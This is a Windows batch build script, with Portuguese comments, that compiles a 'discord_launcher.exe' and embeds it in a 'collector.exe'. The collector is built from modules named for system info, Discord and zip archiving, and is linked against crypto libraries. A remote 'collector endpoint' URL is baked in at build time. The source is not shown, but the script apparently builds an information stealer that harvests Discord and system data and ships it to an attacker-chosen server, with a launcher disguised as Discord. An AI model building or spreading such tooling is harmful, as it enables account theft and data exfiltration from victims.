@echo off
call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
cd /d "C:\Users\ildin\cheat\Troll\collector"

rem ── Endpoint da API (primeiro argumento do build.bat) ──────────────────────
set ENDPOINT=%~1
if "%ENDPOINT%"=="" (
    echo [AVISO] Nenhum endpoint fornecido. Uso: build.bat http://host:porta
    echo [AVISO] Usando padrao: http://localhost:3000
    set ENDPOINT=http://localhost:3000
)
echo [*] Endpoint: %ENDPOINT%
echo #define COLLECTOR_ENDPOINT "%ENDPOINT%" > endpoint.h
echo [OK] endpoint.h gerado.

echo.
echo [1/3] Compilando discord_launcher.exe...
cl /EHsc /O2 /MT /std:c++17 ^
    launcher.cpp ^
    user32.lib shell32.lib ws2_32.lib ^
    /Fe:discord_launcher.exe ^
    /link /subsystem:console

if %errorlevel% neq 0 (
    echo [ERRO] Falha ao compilar launcher.
    pause & exit /b 1
)
echo [OK] discord_launcher.exe pronto.

echo.
echo [2/3] Compilando recursos (embed launcher no collector)...
rc.exe /nologo resources.rc

if %errorlevel% neq 0 (
    echo [ERRO] Falha ao compilar resources.rc
    pause & exit /b 1
)
echo [OK] resources.res pronto.

echo.
echo [3/3] Compilando collector.exe (com launcher embutido)...
cl /EHsc /O2 /MT /std:c++17 /I. ^
    main.cpp zip_writer.cpp sysinfo.cpp discord.cpp ^
    resources.res ^
    winhttp.lib advapi32.lib shell32.lib crypt32.lib bcrypt.lib ^
    /Fe:collector.exe

if %errorlevel% == 0 (
    echo [OK] collector.exe pronto.
    echo.
    echo ============================================
    echo  Tudo compilado! Execute: collector.exe
    echo  O launcher esta embutido no exe.
    echo ============================================
) else (
    echo [ERRO] Falha na compilacao do collector.
)
pause
